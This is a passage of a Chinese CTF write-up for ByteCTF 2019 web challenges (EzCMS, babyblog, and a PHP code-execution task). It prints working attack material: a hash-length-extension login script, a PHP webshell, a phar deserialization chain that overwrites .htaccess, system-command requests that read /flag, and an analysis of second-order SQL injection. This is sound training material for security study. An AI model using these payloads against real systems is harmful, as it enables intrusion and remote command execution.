+<p>于是就尝试了一下<code>if()</code>回到上级目录，也就是这里才发现那个正则是<code>a(b())c()</code>这样匹配的<br>用同样的方法扫目录，然后<code>next()</code>读到<code>..</code>，<code>chdir()</code>去到上级目录，于是最终的payload就是<br><code>if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</code><br>由于要读两回，几率小了一些</p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/a5c58e5437d4299a0f3404f50e092094.png" alt=""></p>
+<p>没买域名就改成了localhost</p>
+<h2 id="EzCMS"><a href="#EzCMS" class="headerlink" title="EzCMS"></a>EzCMS</h2><p>登录进去，可以看到目录下有个<code>.htaccess</code>，传个图片试试，提示需要admin</p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/284626ee56b4c7db3fbdce20f6c9397a.png" alt=""></p>
+<p>于是用admin作为用户名登录进去，但上传还是提示非admin。于是搜集一下信息发现<code>www.zip</code>给了源码，读一波</p>
+<p><code>index.php</code>中限制了psw不能为admin</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($password === &quot;admin&quot;)&#123;</span><br><span class="line">       die(&quot;u r not admin !!!&quot;);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>然后去看一下<code>config.php</code>中的<code>login()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function login()&#123;</span><br><span class="line">    $secret = &quot;********&quot;;</span><br><span class="line">    setcookie(&quot;hash&quot;, md5($secret.&quot;adminadmin&quot;));</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>基本确定这里要哈希扩展了</p>
+<p>然后沿着<code>upload.php</code>读，读到Profile类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function is_admin()&#123;</span><br><span class="line">       $this-&gt;username = $_SESSION[&apos;username&apos;];</span><br><span class="line">       $this-&gt;password = $_SESSION[&apos;password&apos;];</span><br><span class="line">       $secret = &quot;********&quot;;</span><br><span class="line">       if ($this-&gt;username === &quot;admin&quot; &amp;&amp; $this-&gt;password != &quot;admin&quot;)&#123;</span><br><span class="line">           if ($_COOKIE[&apos;user&apos;] === md5($secret.$this-&gt;username.$this-&gt;password))&#123;</span><br><span class="line">               return 1;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       return 0;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>这里要求与哈希后的值相等，那就哈希扩展一波</p>
+<p>不知长度于是写一波脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import my_md5</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def md5_attack(samplehash, num, msg1, msg2):</span><br><span class="line">	s1=eval(&apos;0x&apos;+samplehash[:8].decode(&apos;hex&apos;)[::-1].encode(&apos;hex&apos;))</span><br><span class="line">	s2=eval(&apos;0x&apos;+samplehash[8:16].decode(&apos;hex&apos;)[::-1].encode(&apos;hex&apos;))</span><br><span class="line">	s3=eval(&apos;0x&apos;+samplehash[16:24].decode(&apos;hex&apos;)[::-1].encode(&apos;hex&apos;))</span><br><span class="line">	s4=eval(&apos;0x&apos;+samplehash[24:32].decode(&apos;hex&apos;)[::-1].encode(&apos;hex&apos;))</span><br><span class="line"></span><br><span class="line">	secret = &quot;a&quot;*num</span><br><span class="line">	length = num + len(msg1)</span><br><span class="line">	test=secret+msg1+&apos;\x80&apos;+&apos;\x00&apos;*((512-length*8-8-8*8)/8)+chr(length*8)+&apos;\x00\x00\x00\x00\x00\x00\x00&apos;+msg2</span><br><span class="line">	s = my_md5.deal_rawInputMsg(test)</span><br><span class="line">	r = my_md5.deal_rawInputMsg(secret+msg1)</span><br><span class="line">	inp = s[len(r):]</span><br><span class="line"></span><br><span class="line">	res = &#123;&apos;str&apos;:test[num:], &apos;hash&apos;:my_md5.run_md5(s1,s2,s3,s4,inp)&#125;</span><br><span class="line">	return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = &quot;http://fc4183f4-3d2c-4251-86f0-a6ad94130f54.node3.buuoj.cn&quot;</span><br><span class="line">upload = &quot;http://fc4183f4-3d2c-4251-86f0-a6ad94130f54.node3.buuoj.cn/upload.php&quot;</span><br><span class="line">for i in range(20):</span><br><span class="line">	res = md5_attack(&quot;52107b08c0f3342d2153ae1d68e6262c&quot;,i,&apos;adminadmin&apos;,&apos;admin&apos;)</span><br><span class="line">	user_psw = res[&apos;str&apos;]</span><br><span class="line">	data = &#123;</span><br><span class="line">		&apos;username&apos;:&apos;admin&apos;,</span><br><span class="line">		&apos;password&apos;:user_psw[5:],</span><br><span class="line">		&apos;login&apos;:&quot;提交&quot;</span><br><span class="line">	&#125;</span><br><span class="line">	cookies = &#123;</span><br><span class="line">		&apos;PHPSESSID&apos;:&apos;cf8e7d852e9d67dedc3dbec6f4860088&apos;,</span><br><span class="line">		&apos;user&apos;:res[&apos;hash&apos;]</span><br><span class="line">	&#125;</span><br><span class="line">	r = requests.post(url = url, data = data, cookies = cookies)</span><br><span class="line"></span><br><span class="line">	test = b&quot;&quot;&quot;test</span><br><span class="line">	# &quot;&quot;&quot;</span><br><span class="line">	files = [(&apos;file&apos;,(&apos;1.jpg&apos;,test,&apos;image/jpeg&apos;))]</span><br><span class="line">	data = &#123;&quot;upload&quot;:&quot;提交&quot;&#125;</span><br><span class="line">	r = requests.post(url = upload, data = data, files = files, cookies = cookies)</span><br><span class="line"></span><br><span class="line">	if &apos;u r not admin&apos; not in r.text:</span><br><span class="line">		print r.text</span><br><span class="line">		break</span><br><span class="line">	print i</span><br><span class="line">print res[&apos;hash&apos;]</span><br></pre></td></tr></table></figure>
+<p>这里真的整傻我了，怎么跑都跑不出来还以为是之前哈希扩展的脚本有问题，后面才发现比较的是cookie中的user，巨坑</p>
+<p>能上传后，直接传一句话然而有check</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function check()&#123;</span><br><span class="line">       $content = file_get_contents($this-&gt;filename);</span><br><span class="line">       $black_list = [&apos;system&apos;,&apos;eval&apos;,&apos;exec&apos;,&apos;+&apos;,&apos;passthru&apos;,&apos;`&apos;,&apos;assert&apos;];</span><br><span class="line">       foreach ($black_list as $k=&gt;$v)&#123;</span><br><span class="line">           if (stripos($content, $v) !== false)&#123;</span><br><span class="line">               die(&quot;your file make me scare&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       return 1;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>由于是php7，于是可以用复杂变量绕</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&apos;a&apos;];</span><br><span class="line">$b = $_GET[&apos;b&apos;];</span><br><span class="line">$a($b);</span><br></pre></td></tr></table></figure>
+<p>不过传成功后访问显示500，八成是那个<code>.htaccess</code>在搞鬼，导致这个目录下php执行不了。那只能想办法在其他目录下执行，或者把这个<code>.htaccess</code>重写或删掉。由于不知道临时目录在哪，也没有能目录穿越的地方，只能想办法重写或删掉<code>.htaccess</code></p>
+<p>翻一下<code>config.php</code>，可以看到File类中过滤了phar等一系列协议，同时使用了<code>mine_content_type()</code>，在SUCTF中也说过，想</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function view_detail()&#123;</span><br><span class="line"></span><br><span class="line">       if (preg_match(&apos;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&apos;, $this-&gt;filepath))&#123;</span><br><span class="line">           die(&quot;nonono~&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">       $mine = mime_content_type($this-&gt;filepath);</span><br><span class="line">       $store_path = $this-&gt;open($this-&gt;filename, $this-&gt;filepath);</span><br><span class="line">       $res[&apos;mine&apos;] = $mine;</span><br><span class="line">       $res[&apos;store_path&apos;] = $store_path;</span><br><span class="line">       return $res;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>在SUCTF中也出现过类似的过滤，可以使用php://filter/resource=phar来绕过，而且像<code>mine_content_type()</code>这种要读取文件的方法大概率都可以用来phar的反序列化，猜测这题是要利用phar反序列化了</p>
+<p>接着找一下哪里使用了File类，在<code>view.php</code>中找到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include (&quot;config.php&quot;);</span><br><span class="line">$file_name = $_GET[&apos;filename&apos;];</span><br><span class="line">$file_path = $_GET[&apos;filepath&apos;];</span><br><span class="line">$file_name=urldecode($file_name);</span><br><span class="line">$file_path=urldecode($file_path);</span><br><span class="line">$file = new File($file_name, $file_path);</span><br><span class="line">$res = $file-&gt;view_detail();</span><br><span class="line">$mine = $res[&apos;mine&apos;];</span><br><span class="line">$store_path = $res[&apos;store_path&apos;];</span><br><span class="line"></span><br><span class="line">echo &lt;&lt;&lt;EOT</span><br><span class="line">&lt;div style=&quot;height: 30px; width: 1000px;&quot;&gt;</span><br><span class="line">&lt;Ariel&gt;mine: &#123;$mine&#125;&lt;/Ariel&gt;&lt;br&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div style=&quot;height: 30px; &quot;&gt;</span><br><span class="line">&lt;Ariel&gt;file_path: &#123;$store_path&#125;&lt;/Ariel&gt;&lt;br&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">EOT;</span><br></pre></td></tr></table></figure>
+<p>上传再用这里访问就没问题了，于是找链</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class Profile&#123;</span><br><span class="line"></span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $admin;</span><br><span class="line"></span><br><span class="line">    public function is_admin()&#123;</span><br><span class="line">        $this-&gt;username = $_SESSION[&apos;username&apos;];</span><br><span class="line">        $this-&gt;password = $_SESSION[&apos;password&apos;];</span><br><span class="line">        $secret = &quot;********&quot;;</span><br><span class="line">        if ($this-&gt;username === &quot;admin&quot; &amp;&amp; $this-&gt;password != &quot;admin&quot;)&#123;</span><br><span class="line">            if ($_COOKIE[&apos;user&apos;] === md5($secret.$this-&gt;username.$this-&gt;password))&#123;</span><br><span class="line">                return 1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;admin-&gt;open($this-&gt;username, $this-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看Profile发现，<code>__call()</code>中调用了admin的<code>open()</code>，而<code>config.php</code>中只有File类有<code>open()</code>，但File类并没有用到Profile类。那这个“没用”的admin可能是给我们用来反序列化的，于是去内置类中查查看有没有能利用的类有<code>open()</code></p>
+<p>fuzz一下发现这几个类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=get_declared_classes();</span><br><span class="line">foreach($a as $class)&#123;</span><br><span class="line">	$arr_func=get_class_methods($class);</span><br><span class="line">	if(in_array(&apos;open&apos;,$arr_func))&#123;</span><br><span class="line">		echo $class.&apos;&lt;br&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SessionHandler</span><br><span class="line">ZipArchive</span><br><span class="line">XMLReader</span><br><span class="line">SQLite3</span><br></pre></td></tr></table></figure>
+<p>接着去翻一下手册看看</p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/afb8c82dc59a5e8d5bc90e71d888d20d.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/52461e94e45baee6a6705d5c90b8378d.png" alt=""></p>
+<p>ZipArchive类的<code>open()</code>可以传入两个参数，第二个参数为打开的模式，当模式为<code>ZIPARCHIVE::OVERWRITE</code>时会覆盖掉文件</p>
+<p>那就是要想办法调用到Profile类的<code>__call()</code><br>回到File类，看到<code>__destruct()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function __destruct()</span><br><span class="line">   &#123;</span><br><span class="line">       if (isset($this-&gt;checker))&#123;</span><br><span class="line">           $this-&gt;checker-&gt;upload_file();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>这里调用了checker的<code>upload_file()</code>，而Profile类中没有<code>upload_file()</code>，也就是将checker设置为Profile类就可以调用到<code>__call()</code></p>
+<p>于是构造反序列化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class File&#123;</span><br><span class="line"></span><br><span class="line">    public $filename;</span><br><span class="line">    public $filepath;</span><br><span class="line">    public $checker;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    	$this-&gt;checker = new Profile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Profile&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $admin;  </span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">    	$this-&gt;username = &quot;/var/www/html/sandbox/2c67ca1eaeadbdc1868d67003072b481/.htaccess&quot;;</span><br><span class="line">    	$this-&gt;password = ZIPARCHIVE::OVERWRITE;</span><br><span class="line">    	$this-&gt;admin = new ZipArchive(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&apos;file.phar&apos;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&apos;&lt;?php __HALT_COMPILER(); ?&gt;&apos;); </span><br><span class="line">$file = new File();</span><br><span class="line">$phar-&gt;setMetadata($file);</span><br><span class="line">$phar-&gt;addFromString(&quot;1.txt&quot;, &quot;test&quot;); </span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+<p>执行得到phar文件后上传，在<code>view.php</code>访问<br><code>?filename=c45de65f3d56f100e72db6efa4298d62.phar&amp;filepath=php://filter/resource=phar://sandbox/2c67ca1eaeadbdc1868d67003072b481/c45de65f3d56f100e72db6efa4298d62.phar</code></p>
+<p>再访问一下测试的php</p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/41160c5f97734ce11e5c4cb3c54c1aff.png" alt=""></p>
+<p>执行成功，之后如果再次返回<code>upload.php</code>的话，需要重新重写一次<code>.htaccess</code></p>
+<p>接着访问之前写好了的php<br><code>?a=system&amp;b=cd ../../../../../../;ls</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/870d866a88c48128cb21a129be90378f.png" alt=""></p>
+<p><code>?a=system&amp;b=cat /flag</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""></p>
+<h2 id="babyblog"><a href="#babyblog" class="headerlink" title="babyblog"></a>babyblog</h2><p>注册有一个md5截断，脚本跑一波</p>
+<p>进去有发布、编辑、删除、查看四个界面，感觉像是sql注入但是被单引被过滤了。搞了很久没什么想法扫一下发现给了源码<code>www.zip</code></p>
+<p>直接看<code>writing.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"></span><br><span class="line">if(!isset($_SESSION[&apos;id&apos;]))&#123;</span><br><span class="line">	header(&quot;Location: login.php&quot;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;title&apos;]) &amp;&amp; isset($_POST[&apos;content&apos;]))&#123;</span><br><span class="line">	$title = addslashes($_POST[&apos;title&apos;]);</span><br><span class="line">	$content = addslashes($_POST[&apos;content&apos;]);</span><br><span class="line">	$sql-&gt;query(&quot;insert into article (userid,title,content) values (&quot; . $_SESSION[&apos;id&apos;] . &quot;, &apos;$title&apos;,&apos;$content&apos;);&quot;);</span><br><span class="line">	exit(&quot;&lt;script&gt;alert(&apos;Posted successfully.&apos;);location.href=&apos;index.php&apos;;&lt;/script&gt;&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	include(&quot;templates/writing.html&quot;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里对title和content都进行了<code>addslashes()</code>转义</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"></span><br><span class="line">if(!isset($_SESSION[&apos;id&apos;]))&#123;</span><br><span class="line">	header(&quot;Location: login.php&quot;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$article = array();</span><br><span class="line">foreach($sql-&gt;query(&quot;select * from article where userid=&quot;.$_SESSION[&apos;id&apos;].&quot;;&quot;) as $row)&#123;</span><br><span class="line">	array_unshift($article, $row);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include(&quot;templates/index.html&quot;);</span><br></pre></td></tr></table></figure>
+<p><code>index.php</code>用的是session中的id，基本是利用不了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"></span><br><span class="line">if(!isset($_SESSION[&apos;id&apos;]))&#123;</span><br><span class="line">	header(&quot;Location: login.php&quot;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;id&apos;]))&#123;</span><br><span class="line">	foreach($sql-&gt;query(&quot;select * from article where id=&quot; . intval($_GET[&apos;id&apos;]) . &quot;;&quot;) as $v)&#123;</span><br><span class="line">		$row = $v;</span><br><span class="line">	&#125;</span><br><span class="line">	if($_SESSION[&apos;id&apos;] == $row[&apos;userid&apos;])&#123;</span><br><span class="line">		$sql-&gt;query(&quot;delete from article where id=&quot; . intval($_GET[&apos;id&apos;]) . &quot;;&quot;);</span><br><span class="line">		exit(&quot;&lt;script&gt;alert(&apos;Deleted successfully.&apos;);history.go(-1);&lt;/script&gt;&quot;);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		exit(&quot;&lt;script&gt;alert(&apos;You do not have permission.&apos;);history.go(-1);&lt;/script&gt;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>delete.php</code>将传入的id进行了<code>intval()</code>，也无法利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"></span><br><span class="line">if(!isset($_SESSION[&apos;id&apos;]))&#123;</span><br><span class="line">	header(&quot;Location: login.php&quot;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;id&apos;]))&#123;</span><br><span class="line">	foreach($sql-&gt;query(&quot;select * from article where id=&quot; . intval($_GET[&apos;id&apos;]) . &quot;;&quot;) as $v)&#123;</span><br><span class="line">		$row = $v;</span><br><span class="line">	&#125;</span><br><span class="line">	if($_SESSION[&apos;id&apos;] == $row[&apos;userid&apos;])&#123;</span><br><span class="line">		include(&quot;templates/edit.html&quot;);</span><br><span class="line">		exit();</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		exit(&quot;&lt;script&gt;alert(&apos;You do not have permission.&apos;);history.go(-1);&lt;/script&gt;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;title&apos;]) &amp;&amp; isset($_POST[&apos;content&apos;]) &amp;&amp; isset($_POST[&apos;id&apos;]))&#123;</span><br><span class="line">	foreach($sql-&gt;query(&quot;select * from article where id=&quot; . intval($_POST[&apos;id&apos;]) . &quot;;&quot;) as $v)&#123;</span><br><span class="line">		$row = $v;</span><br><span class="line">	&#125;</span><br><span class="line">	if($_SESSION[&apos;id&apos;] == $row[&apos;userid&apos;])&#123;</span><br><span class="line">		$title = addslashes($_POST[&apos;title&apos;]);</span><br><span class="line">		$content = addslashes($_POST[&apos;content&apos;]);</span><br><span class="line">		$sql-&gt;query(&quot;update article set title=&apos;$title&apos;,content=&apos;$content&apos; where title=&apos;&quot; . $row[&apos;title&apos;] . &quot;&apos;;&quot;);</span><br><span class="line">		exit(&quot;&lt;script&gt;alert(&apos;Edited successfully.&apos;);location.href=&apos;index.php&apos;;&lt;/script&gt;&quot;);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		exit(&quot;&lt;script&gt;alert(&apos;You do not have permission.&apos;);history.go(-1);&lt;/script&gt;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>不过在<code>edit.php</code>可以看到，虽然对传入title和content进行了<code>addslashes()</code>转义，但是通过sql查询得到的row中的数据并没用转义。尽管之前进行过<code>addslashes()</code>转义，但只是在sql执行时对特殊字符前加一个<code>\</code>防止当作关键字使用，存入数据库的依旧是原本传入的数据。而这里取出时没转义，那就可以利用这里进行注入</p>
+<p>不过就算有注入点，在<code>config.php</code>中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$sql = new PDO(&quot;mysql:host=localhost;dbname=babyblog&quot;, &apos;CTF2019&apos;, &apos;*************&apos;) or die(&quot;SQL Server Down T.T&quot;);</span><br><span class="line"></span><br><span class="line">function SafeFilter(&amp;$arr)&#123;   </span><br><span class="line">	foreach ($arr as $key =&gt; $value) &#123;</span><br><span class="line">		if (!is_array($value))&#123;</span><br><span class="line">			$filter = 